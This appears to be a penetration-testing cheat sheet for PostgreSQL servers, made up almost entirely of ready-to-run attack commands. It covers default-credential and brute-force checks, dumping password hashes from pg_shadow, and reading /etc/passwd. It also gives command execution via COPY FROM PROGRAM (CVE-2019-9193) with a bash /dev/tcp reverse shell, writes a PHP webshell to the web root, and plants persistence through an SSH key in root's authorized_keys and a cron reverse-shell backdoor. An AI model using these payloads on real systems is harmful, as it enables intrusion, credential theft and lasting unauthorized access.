# Port 5432, 5433 - POSTGRESQL

## Table of Contents

- [Enumeration](#enumeration)
  - [Check Connect](#check-connect)
  - [Nuclei](#nuclei)
- [Brute Force](#brute-force)
  - [NetExec](#netexec)
- [Exploit](#exploit)
  - [Command Execution (CVE-2019-9193)](#command-execution-cve-2019-9193)
  - [Webshell via COPY](#webshell-via-copy)
  - [File Read/Write](#file-readwrite)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Test default credentials
PGPASSWORD='postgres' psql -h $rhost -U postgres -c "SELECT version();" 2>/dev/null && echo "[+] Default creds work!"

# Nmap scripts
nmap -p 5432 --script "pgsql-*" $rhost
```

### Database Enumeration (One-liner)

```shell
# List all databases
PGPASSWORD='$pass' psql -h $rhost -U $user -c "SELECT datname FROM pg_database;"

# List all tables in current db
PGPASSWORD='$pass' psql -h $rhost -U $user -d $database -c "SELECT tablename FROM pg_tables WHERE schemaname='public';"

# List users
PGPASSWORD='$pass' psql -h $rhost -U $user -c "SELECT usename,passwd FROM pg_shadow;"

# Read file
PGPASSWORD='$pass' psql -h $rhost -U $user -c "SELECT pg_read_file('/etc/passwd');"
```

- Create New User

    ```shell
    CREATE ROLE role_name;  # Basic role
    CREATE ROLE username 'NewUser' LOGIN PASSWORD 'Pass';  # User with login & pass
    ```

- Change Role

    ```shell
    SET ROLE new_role;
    ```

- Give Permission

    ```shell
    GRANT role_2 TO role_1;  # Allow role_1 to assume role_2
    ```

- List files in Directory

    ```shell
    SELECT pg_ls_dir('./');  # Current dir
    SELECT pg_ls_dir('/etc/');  # Arbitrary path
    ```

- Read File

    ```shell
    SELECT pg_read_file('PG_VERSION', 0, 200);  # Read file (offset 0, length 200 bytes)
    SELECT pg_read_file('flag_ZGE1N.txt');  # Read entire file
    ```


### Nuclei

```shell
nuclei -u $rhost:5432 -tags database,postgres
```

---

## Brute Force

### NetExec

```shell
nxc postgres $rhost -u 'postgres' -p 'postgres'
```

---

## Exploit

### Command Execution (CVE-2019-9193)

> PostgreSQL 9.3+ allows command execution via COPY FROM PROGRAM

```sql
-- Drop table if exists
DROP TABLE IF EXISTS cmd_exec;

-- Create table to store output
CREATE TABLE cmd_exec(cmd_output text);

-- Execute command
COPY cmd_exec FROM PROGRAM 'id';

-- View output
SELECT * FROM cmd_exec;

-- Reverse shell
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"';
```

#### One-liner

```shell
psql -h $rhost -U postgres -c "DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(out text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;"
```

### Webshell via COPY

> Write PHP webshell to web directory

```sql
-- Create table for webshell
DROP TABLE IF EXISTS backdoor;
CREATE TABLE backdoor (content TEXT);

-- Insert PHP code
INSERT INTO backdoor(content) VALUES('<?php system($_REQUEST["cmd"]); ?>');

-- Write to web directory
COPY backdoor(content) TO '/var/www/html/cmd.php';

-- Cleanup
DROP TABLE backdoor;
```

```shell
# Access webshell
curl "http://$rhost/cmd.php?cmd=whoami"
curl "http://$rhost/cmd.php?cmd=id"
```

#### Alternative: Direct File Write

```sql
-- Write directly using pg_file_write (superuser required)
SELECT pg_file_write('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>', true);
```

### File Read/Write

#### Read Files

```sql
-- Using pg_read_file (relative to data directory)
SELECT pg_read_file('PG_VERSION');
SELECT pg_read_file('/etc/passwd');  -- May require absolute path

-- Using COPY
CREATE TEMP TABLE pwned(content text);
COPY pwned FROM '/etc/passwd';
SELECT * FROM pwned;

-- Using lo_import (large objects)
SELECT lo_import('/etc/passwd');
\lo_list  -- Get OID
SELECT loid, pageno, encode(data, 'escape') FROM pg_largeobject;
```

#### Write Files

```sql
-- Write SSH key
COPY (SELECT 'ssh-rsa AAAA... user@host') TO '/root/.ssh/authorized_keys';

-- Write to cron
COPY (SELECT '* * * * * root bash -i >& /dev/tcp/$lhost/$lport 0>&1') TO '/etc/cron.d/backdoor';
```
